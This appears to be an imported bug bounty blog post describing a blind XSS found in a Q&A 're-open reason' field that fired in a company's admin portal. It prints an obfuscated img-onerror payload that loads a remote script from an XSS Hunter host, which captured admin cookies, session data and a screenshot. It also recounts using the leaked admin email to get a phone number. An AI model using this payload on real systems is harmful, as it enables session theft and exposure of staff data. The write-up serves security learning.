---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-24_blind-xss-on-admin-portal-leads-to-information-disclosure.md
original_filename: 2022-09-24_blind-xss-on-admin-portal-leads-to-information-disclosure.md
title: Blind XSS on Admin Portal Leads to Information Disclosure
category: documents
detected_topics:
- xss
- command-injection
- information-disclosure
tags:
- imported
- documents
- xss
- command-injection
- information-disclosure
language: en
raw_sha256: d729b820f910236601067969b632cc674676c58be108bdc6365e370c12cdee3a
text_sha256: 59818bded1345fc2172afcd14bbca719524d1041cc39c13910135b16c869d97b
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# Blind XSS on Admin Portal Leads to Information Disclosure

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-24_blind-xss-on-admin-portal-leads-to-information-disclosure.md
- Source Type: markdown
- Detected Topics: xss, command-injection, information-disclosure
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `d729b820f910236601067969b632cc674676c58be108bdc6365e370c12cdee3a`
- Text SHA256: `59818bded1345fc2172afcd14bbca719524d1041cc39c13910135b16c869d97b`


## Content

---
title: "Blind XSS on Admin Portal Leads to Information Disclosure"
url: "https://rohit443.medium.com/blind-xss-on-admin-portal-leads-to-information-disclosure-121d26b2a35a"
authors: ["Rohit Kumar (Rohit_443)"]
bugs: ["Blind XSS"]
publication_date: "2022-09-24"
added_date: "2022-09-26"
source: "pentester.land/writeups.json"
original_index: 2122
scraped_via: "browseros"
---

# Blind XSS on Admin Portal Leads to Information Disclosure

Blind XSS on Admin Portal Leads to Information Disclosure
Rohit_443
Follow
3 min read
·
Sep 24, 2022

90

4

Hello Everyone

I Am writing my third bug bounty write-up which is Blind XSS on Admin Portal leads to information disclosure. In which i have found hidden function of the web-page where an user can ask Q&A. And there is no input validation on forms and that leads to perform XSS attacks.

What is Blind XSS..?

Blind XSS are a variant of persistent XSS vulnerabilities. They occur when the attacker input is saved by the web server and executed as a malicious script in another part of the application or in another application. For example, an attacker injects a malicious payload into a contact/feedback page and when the administrator of the application is reviewing the feedback entries the attacker’s payload will be loaded. The attacker input can be executed in a completely different application for example an internal application where the administrator reviews the access logs or the application exceptions.

Contact/Feedback pages
Log viewers
Exception handlers
Chat applications / forums
Customer ticket applications
Web Application Firewalls
Any application that requires user moderation
Press enter or click to view image in full size
Blind XSS Attacks

Lets get started with the finding.

Get Rohit_443’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I am decided to hunt for bugs on a target, there is lots of functionality on the target web-app. checking one by one all the functions , i have found a Ask Q&A functionality on the target. And i have ask 2,3 question by injecting XSS Payload but not executed. At the time of Ask Q&A , there is proper input validation on forms , so my payloads was not executed.

So, After a day i have received a mail in early morning that regarding my questions was answer, So i opened my browser and visit the Question and see someone from that company has answered my question.

So, The Exploitation phase is start here. After i am getting answered by the admin , i have got an option on my Q&A , which is Re-open , I just click on it, and there is a field to insert reason for Re-opening this Q&A. Here, I Inject my payload of XSSHUNTER and Re-open.

Payload:-”><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbWRtZGRtbS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>

After 2 days ,i received a mail from XSSHUNTER , payload fired ,and all the information session, cookies , URL , IP,Admin Dashboard Screenshot have received on my XSS account.

Press enter or click to view image in full size
XSSHUNTERREPORT

After getting the URL where payload is fired , i opened that URL try to bypass Authentication on login portal but not able to bypass it. So, I have email id of admin which i have found in the Screenshot of admin dashboard. I use this on forget password and found admin phone number as well. So,I reported this bug to the company , and get rewarded with $$$.

Press enter or click to view image in full size
Blind xss reward

Thank you for your time.

For Upcoming writeup.

Follow me on twitter https://twitter.com/Rohit_443
